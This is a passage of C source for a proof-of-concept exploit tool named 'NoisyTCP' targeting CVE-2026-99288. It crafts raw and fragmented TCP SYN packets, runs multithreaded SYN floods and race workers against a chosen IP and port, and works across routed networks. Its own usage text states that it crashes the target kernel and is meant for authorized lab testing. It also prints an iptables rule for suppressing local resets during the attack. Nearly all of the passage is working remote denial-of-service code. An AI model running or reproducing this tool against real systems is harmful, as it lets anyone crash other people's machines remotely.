            fb[n].len = frame_single(fb[n].data, sp, seq, 0, TH_SYN,
                                     opts, ol, NULL, 0, (uint16_t)(0x4010 + i));
            n++;
        } else {
            uint8_t tmp[2 * FRAME_MAX];
            int l1 = 0, l2 = 0;
            int nf = frame_frag_len(tmp, &l1, &l2, sp, seq, 0, TH_SYN,
                                    opts, ol, NULL, 0,
                                    (uint16_t)(0x4110 + i), first);
            fb[n].len = l1; memcpy(fb[n].data, tmp, l1); n++;
            if (nf == 2 && n < BATCH_MAX) {
                fb[n].len = l2; memcpy(fb[n].data, tmp + FRAME_MAX, l2); n++;
            }
        }
    }

    int sock = open_tx_socket();
    if (sock < 0) {
        fprintf(stderr, "probe: TX socket failed: %s\n", strerror(errno));
        return -1;
    }
    send_batch(sock, fb, n);
    close(sock);

    int seen = 0;
    uint64_t deadline = now_ms() + 3000;
    uint8_t buf[2048];
    while (seen < want && now_ms() < deadline) {
        struct pollfd p = { .fd = rx_sock, .events = POLLIN };
        if (poll(&p, 1, 100) <= 0) continue;
        ssize_t r = recv(rx_sock, buf, sizeof(buf), 0);
        if (r < (ssize_t)(ETHER_HDR_LEN + sizeof(struct iphdr))) continue;
        if (((buf[12] << 8) | buf[13]) != ETH_P_IP) continue;
        const struct iphdr *ip = (const struct iphdr *)(buf + ETHER_HDR_LEN);
        if (ip->protocol != IPPROTO_TCP || ip->saddr != cfg.dst_ip) continue;
        int ihl = ip->ihl * 4;
        if ((int)r < ETHER_HDR_LEN + ihl + (int)sizeof(struct tcphdr)) continue;
        const struct tcphdr *th =
            (const struct tcphdr *)(buf + ETHER_HDR_LEN + ihl);
        if (!th->syn || !th->ack) continue;
        if (ntohs(th->source) != cfg.dport) continue;
        uint16_t dp = ntohs(th->dest);
        if (dp >= p0 && dp < (uint16_t)(p0 + want)) seen++;
    }
    return seen;
}

/* ------------------------------------------------------------------ */
/* Selftest: build sample packets and dump, no network                 */
/* ------------------------------------------------------------------ */
static void hexdump(const char *tag, const uint8_t *p, int n)
{
    fprintf(stderr, "%s (%d bytes):", tag, n);
    for (int i = 0; i < n; i++) fprintf(stderr, " %02x", p[i]);
    fprintf(stderr, "\n");
}

static int selftest(void)
{
    cfg.src_ip = inet_addr("10.0.0.1");
    cfg.dst_ip = inet_addr("10.0.0.2");
    cfg.dport = 80;
    memset(cfg.src_mac, 0x11, 6);
    memset(cfg.dst_mac, 0x22, 6);
    uint8_t opts[4]; int ol = mss_option(opts, cfg.mss);
    uint8_t f[FRAME_MAX];
    int n = frame_single(f, 40000, 0xdeadbeef, 0, TH_SYN, opts, ol, NULL, 0, 1);
    hexdump("SYN", f, n);
    n = frame_single(f, 40000, 0xdeadbeef + 1, 0, TH_RST, NULL, 0, NULL, 0, 2);
    hexdump("RST", f, n);
    uint8_t two[2 * FRAME_MAX]; int l1, l2;
    uint8_t pad[8] = {0};
    int nf = frame_frag_len(two, &l1, &l2, 40000, 0xdeadbeef + 1, 0, TH_ACK,
                            NULL, 0, pad, 8, 3, 8);
    hexdump("ACK frag1", two, l1);
    if (nf == 2) hexdump("ACK frag2", two + FRAME_MAX, l2);
    fprintf(stderr, "selftest ok: %d fragments\n", nf);
    return 0;
}

/* ------------------------------------------------------------------ */
/* CLI / safety                                                        */
/* ------------------------------------------------------------------ */
static void usage(const char *p)
{
    fprintf(stderr,
"NoisyTCP PoC (CVE-2026-99288) -- AUTHORIZED LAB TESTING ONLY\n"
"Usage: %s --target IP --port P [opts]\n"
"\n"
"Required:\n"
"  --target IP           single target IPv4 address\n"
"  --port P              target TCP port (e.g. 80/443/22/25565)\n"
"\n"
"Options:\n"
"  --iface IF            egress interface (auto from route if omitted)\n"
"  --src IP              source IPv4 (default: iface address)\n"
"  --dst-mac MAC         target MAC (L2 mode; default: ARP-resolve)\n"
"  --l3                  force routed raw-IP TX (target behind a gateway)\n"
"  --l2                  force AF_PACKET TX (target on the same L2 segment)\n"
"  --tuples N            race tuples (default 8, max %d)\n"
"  --base-sport P        first race source port (default 40000)\n"
"  --flood-pps N         SYN flood rate per flood thread (default 20000)\n"
"  --flood-threads N     SYN flood threads (default 1, max %d)\n"
"  --race-pps N          probe rate per race thread (default 20000)\n"
"  --race-threads N      race worker threads (default 4, max %d, <= tuples)\n"
"  --pulse-ms N          flood gate period ms, 0=always on (default 400)\n"
"  --burst N             probes per cycle, 1..6 (default 3)\n"
"  --duration S          stop after S seconds (default: until Ctrl-C)\n"
"  --mss N               SYN MSS (default 1460)\n"
"  --nofrag              disable fragmentation (debug; race won't trigger)\n"
"  --pin                 pin workers to distinct CPUs\n"
"  --probe               plain+fragmented SYN check, report, exit\n"
"  --dry-run             build packets but do not send\n"
"  --selftest            dump sample packets and exit\n"
"\n"
"L2 vs L3 is auto-detected: an on-link target uses AF_PACKET/ARP, a routed\n"
"target uses raw IP with IP_HDRINCL (works across gateways, no MAC needed).\n"
"\n"
"This tool crashes the target kernel. Use only on systems you own or are\n"
"explicitly authorized to test. See README.md.\n",
        p, MAX_TUPLES, MAX_RACE_THREADS, MAX_RACE_THREADS);
}

static int parse_mac(const char *s, uint8_t *m)
{
    unsigned v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) m[i] = (uint8_t)v[i];
    return 0;
}

static uint32_t iface_ipv4(const char *ifname)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    memcpy(ifr.ifr_name, ifname, strnlen(ifname, IFNAMSIZ - 1));
    ifr.ifr_addr.sa_family = AF_INET;
    uint32_t a = 0;
    if (ioctl(fd, SIOCGIFADDR, &ifr) == 0)
        a = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
    close(fd);
    return a;
}

static void on_sig(int sig) { (void)sig; atomic_store(&running, 0); }

int main(int argc, char **argv)
{
    static struct option lo[] = {
        {"iface", required_argument, 0, 'i'},
        {"target", required_argument, 0, 't'},
        {"port", required_argument, 0, 'p'},
        {"src", required_argument, 0, 's'},
        {"dst-mac", required_argument, 0, 'm'},
        {"tuples", required_argument, 0, 'n'},
        {"base-sport", required_argument, 0, 'b'},
        {"flood-pps", required_argument, 0, 'F'},
        {"flood-threads", required_argument, 0, 'X'},
        {"race-pps", required_argument, 0, 'R'},
        {"race-threads", required_argument, 0, 'T'},
        {"pulse-ms", required_argument, 0, 'P'},
        {"burst", required_argument, 0, 'B'},
        {"duration", required_argument, 0, 'd'},
        {"mss", required_argument, 0, 'M'},
        {"nofrag", no_argument, 0, 'N'},
        {"pin", no_argument, 0, 'G'},
        {"dry-run", no_argument, 0, 'D'},
        {"selftest", no_argument, 0, 'S'},
        {"l3", no_argument, 0, '3'},
        {"l2", no_argument, 0, '2'},
        {"probe", no_argument, 0, 'C'},
        {"help", no_argument, 0, 'h'},
        {0,0,0,0}
    };
    int c, have_dstmac = 0;
    while ((c = getopt_long(argc, argv, "i:t:p:s:m:n:b:F:X:R:T:P:B:d:M:NDS23CG", lo, NULL)) != -1) {
        switch (c) {
        case 'i': memcpy(cfg.iface, optarg, strnlen(optarg, IFNAMSIZ-1)); break;
        case 't': cfg.dst_ip = inet_addr(optarg); break;
        case 'p': cfg.dport = (uint16_t)atoi(optarg); break;
        case 's': cfg.src_ip = inet_addr(optarg); break;
        case 'm': if (parse_mac(optarg, cfg.dst_mac)==0) have_dstmac=1; break;
        case 'n': cfg.tuples = atoi(optarg); break;
        case 'b': cfg.base_sport = (uint16_t)atoi(optarg); break;
        case 'F': cfg.flood_pps = atoi(optarg); break;
        case 'X': cfg.flood_threads = atoi(optarg); break;
        case 'R': cfg.race_pps = atoi(optarg); break;
        case 'T': cfg.race_threads = atoi(optarg); break;
        case 'P': cfg.pulse_ms = atoi(optarg); break;
        case 'B': cfg.burst = atoi(optarg); break;
        case 'd': cfg.duration_s = atoi(optarg); break;
        case 'M': cfg.mss = atoi(optarg); break;
        case 'N': cfg.nofrag = 1; break;
        case 'D': cfg.dry_run = 1; break;
        case 'S': cfg.selftest = 1; break;
        case '3': cfg.force_l3 = 1; break;
        case '2': cfg.force_l2 = 1; break;
        case 'C': cfg.probe = 1; break;
        case 'G': cfg.pin = 1; break;
        default: usage(argv[0]); return 1;
        }
    }

    if (cfg.selftest) return selftest();

    if (cfg.tuples < 1 || cfg.tuples > MAX_TUPLES) {
        fprintf(stderr, "tuples must be 1..%d\n", MAX_TUPLES); return 1;
    }
    if (!cfg.dst_ip || !cfg.dport) { usage(argv[0]); return 1; }

    char dst_s[INET_ADDRSTRLEN] = "?", src_s[INET_ADDRSTRLEN] = "?";
    inet_ntop(AF_INET, &cfg.dst_ip, dst_s, sizeof(dst_s));

    /* --- L2 (on-link, AF_PACKET/ARP) vs L3 (routed, raw IP) --- */
    char rif[IFNAMSIZ] = {0};
    uint32_t gw = 0;
    int have_route = route_lookup(cfg.dst_ip, rif, sizeof(rif), &gw);
    if (cfg.force_l3)      cfg.l3 = 1;
    else if (cfg.force_l2) cfg.l3 = 0;
    else                   cfg.l3 = (have_route == 0 && gw != 0);

    if (!cfg.iface[0] && have_route == 0)
        snprintf(cfg.iface, sizeof(cfg.iface), "%s", rif);
    if (!cfg.iface[0]) {
        fprintf(stderr, "no route to %s and no --iface given\n", dst_s);
        return 1;
    }
    if (cfg.l3 && have_route < 0)
        fprintf(stderr, "[!] no /proc/net/route entry for %s; using --iface\n",
                dst_s);

    if (cfg.dry_run) {
        fprintf(stderr, "[*] DRY-RUN: no packets will be sent\n");
        if (cfg.duration_s == 0) cfg.duration_s = 3;
    } else {
        fprintf(stderr,
            "\n============================================================\n"
            " NoisyTCP PoC -- CVE-2026-99288 -- WILL CRASH THE TARGET\n"
            " target=%s:%u iface=%s tuples=%d race-threads=%d mode=%s\n"
            " Authorized lab testing only. Ctrl-C to stop.\n"
            "============================================================\n\n",
            dst_s, cfg.dport, cfg.iface, cfg.tuples, cfg.race_threads,
            cfg.l3 ? "routed(L3)" : "onlink(L2)");
    }

    if (get_if_info() < 0) {
        fprintf(stderr, "cannot read iface %s: %s\n", cfg.iface, strerror(errno));
        return 1;
    }
    if (!cfg.src_ip) cfg.src_ip = iface_ipv4(cfg.iface);
    if (!cfg.src_ip) { fprintf(stderr, "no source IP; use --src\n"); return 1; }
    inet_ntop(AF_INET, &cfg.src_ip, src_s, sizeof(src_s));
    ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu < 1) ncpu = 1;

    /* clamp race worker count: at least 1, at most MAX_RACE_THREADS and tuples */
    if (cfg.race_threads < 1) cfg.race_threads = 1;
    if (cfg.race_threads > MAX_RACE_THREADS) cfg.race_threads = MAX_RACE_THREADS;
    if (cfg.race_threads > cfg.tuples) cfg.race_threads = cfg.tuples;
    if (cfg.flood_threads < 1) cfg.flood_threads = 1;
    if (cfg.flood_threads > MAX_RACE_THREADS) cfg.flood_threads = MAX_RACE_THREADS;

    rx_sock = -1;
    if (!cfg.dry_run) {
        /* in L3 mode sniff on every iface: the reply may not come back on the
         * egress device on multi-homed hosts */
        rx_sock = open_packet_socket(cfg.l3 ? 0 : cfg.ifindex);
        if (rx_sock < 0) {
            fprintf(stderr, "AF_PACKET socket failed (need root/CAP_NET_RAW): %s\n",
                    strerror(errno));
            return 1;
        }
    }
    memset(&tx_sa, 0, sizeof(tx_sa));
    tx_sa.sll_family = AF_PACKET;
    tx_sa.sll_protocol = htons(ETH_P_IP);
    tx_sa.sll_ifindex = cfg.ifindex;
    tx_sa.sll_halen = 6;
    memcpy(tx_sa.sll_addr, cfg.dst_mac, 6);

    memset(&tx_sin, 0, sizeof(tx_sin));
    tx_sin.sin_family = AF_INET;
    tx_sin.sin_addr.s_addr = cfg.dst_ip;
    tx_sin.sin_port = htons(cfg.dport);

    if (cfg.l3) {
        char gw_s[INET_ADDRSTRLEN] = "-";
        if (gw) inet_ntop(AF_INET, &gw, gw_s, sizeof(gw_s));
        fprintf(stderr,
            "[*] L3 mode via %s next-hop %s: no ARP, kernel routes each frame\n",
            cfg.iface, gw_s);
        fprintf(stderr,
            "[*] suppress the local kernel's RSTs for our ports, else the reply\n"
            "    resets the tuple we are racing:\n"
            "    iptables -I OUTPUT -p tcp --tcp-flags RST RST"
            " -m multiport --sports %u:%u -j DROP\n",
            (unsigned)cfg.base_sport, (unsigned)(cfg.base_sport + cfg.tuples - 1));
    } else if (!have_dstmac && !cfg.dry_run) {
        fprintf(stderr, "[*] ARP-resolving %s ...\n", dst_s);
        if (resolve_dst_mac() < 0) {
            fprintf(stderr, "ARP resolution failed; pass --dst-mac or --l3\n");
            return 1;
        }
        memcpy(tx_sa.sll_addr, cfg.dst_mac, 6);
    }
    fprintf(stderr, "[*] src=%s mac=%02x:%02x:%02x:%02x:%02x:%02x"
                    " dst=%s dst-mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
            src_s,
            cfg.src_mac[0],cfg.src_mac[1],cfg.src_mac[2],cfg.src_mac[3],cfg.src_mac[4],cfg.src_mac[5],
            dst_s,
            cfg.dst_mac[0],cfg.dst_mac[1],cfg.dst_mac[2],cfg.dst_mac[3],cfg.dst_mac[4],cfg.dst_mac[5]);

    if (cfg.probe && !cfg.dry_run) {
        uint16_t b = cfg.base_sport;
        int plain = probe_target(0,   (uint16_t)(b + 128));
        if (plain < 0) return 1;
        int f8  = probe_target(8,   (uint16_t)(b + 144));
        if (f8 < 0) return 1;
        int f32 = probe_target(32,  (uint16_t)(b + 160));
        if (f32 < 0) return 1;
        int f40 = probe_target(40,  (uint16_t)(b + 176));
        if (f40 < 0) return 1;
        fprintf(stderr,
            "[*] probe plain=%d/5 frag8=%d/5 frag32=%d/5 frag40=%d/5"
            " from %s:%u\n", plain, f8, f32, f40, dst_s, cfg.dport);
        if (plain == 0) {
            fprintf(stderr, "[!] no SYN-ACK at all: target down, filtered, "
                            "or an asymmetric return path\n");
        } else if (f8 == 0 && f32 == 0 && f40 == 0) {
            fprintf(stderr, "[!] every fragmented variant dropped while plain "
                            "passes: a hop on the path eats IP fragments (NAT/"
                            "firewall/scrubber). No L3/L4 queue split, race "
                            "cannot fire from this position\n");
        } else if (f8 == 0) {
            fprintf(stderr, "[!] long fragments pass, 8-byte first fragment "
                            "does not: the path inspects the L4 header. Race "
                            "needs the hidden-header split, still blocked\n");
        } else {
            fprintf(stderr, "[*] 8-byte split passes, race is viable\n");
        }
        if (rx_sock >= 0) close(rx_sock);
        return (plain > 0 && f8 > 0) ? 0 : 1;
    }

    /* init tuples */
    srand((unsigned)time(NULL));
    for (int i = 0; i < cfg.tuples; i++) {
        rt[i].sport = cfg.base_sport + i;
        rt[i].isn = (uint32_t)rand() & 0x7fffffff;
        atomic_store(&rt[i].cookie, 0);
        atomic_store(&rt[i].last_seq, 0);
        atomic_store(&rt[i].cookie_ok, 0);
        atomic_store(&rt[i].last_cookie_ms, 0);
        atomic_store(&rt[i].cycles, 0);
    }

    signal(SIGINT, on_sig);
    signal(SIGTERM, on_sig);

    pthread_t th_rx, th_pulse, th_stats;
    pthread_t th_race[MAX_RACE_THREADS];
    pthread_t th_flood[MAX_RACE_THREADS];
    int race_ids[MAX_RACE_THREADS];
    int flood_ids[MAX_RACE_THREADS];
    pthread_create(&th_rx, NULL, rx_thread, NULL);
    pthread_create(&th_pulse, NULL, pulse_thread, NULL);
    pthread_create(&th_stats, NULL, stats_thread, NULL);
    for (int i = 0; i < cfg.flood_threads; i++) {
        flood_ids[i] = i;
        pthread_create(&th_flood[i], NULL, flood_thread, &flood_ids[i]);
    }
    for (int i = 0; i < cfg.race_threads; i++) {
        race_ids[i] = i;
        pthread_create(&th_race[i], NULL, race_thread, &race_ids[i]);
    }

    for (int i = 0; i < cfg.race_threads; i++)
        pthread_join(th_race[i], NULL);
    atomic_store(&running, 0);
    for (int i = 0; i < cfg.flood_threads; i++)
        pthread_join(th_flood[i], NULL);
    pthread_join(th_pulse, NULL);
    pthread_join(th_stats, NULL);
    pthread_join(th_rx, NULL);

    uint64_t cycles = 0;
    for (int i = 0; i < cfg.tuples; i++) cycles += atomic_load(&rt[i].cycles);
    fprintf(stderr, "[*] done. tx=%llu race-cycles=%llu cookies-hit=%llu\n",
            (unsigned long long)atomic_load(&tx_total),
            (unsigned long long)cycles,
            (unsigned long long)atomic_load(&cookie_hits));
    if (rx_sock >= 0) close(rx_sock);
    return 0;
}
